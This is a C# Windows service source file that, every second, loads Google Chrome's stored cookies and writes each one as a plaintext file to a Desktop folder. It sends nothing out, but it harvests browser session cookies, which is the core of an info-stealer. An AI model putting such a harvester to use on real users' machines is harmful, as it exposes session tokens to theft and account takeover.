using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace Cookies_Service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
            this.CanStop = true;
            this.CanShutdown = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            Timer timer = new Timer();
            timer.Interval = 1000;
            timer.AutoReset = true;
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
        }

        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                var chrome_cookies = new Chrome_Cookies();
                var collection = chrome_cookies.Load<Chrome_Cookies>(chrome_cookies.Path);

                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\cookies");
                foreach (Chrome_Cookies item in collection)
                {
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\cookies\\{collection.IndexOf(item)}.txt", item.ToString());
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\EXCEPTION.txt", "Exception: " + ex.Message + "\r\nException Path: " + ex.StackTrace);
            }
        }

        protected override void OnStop()
        {
        }
    }
}
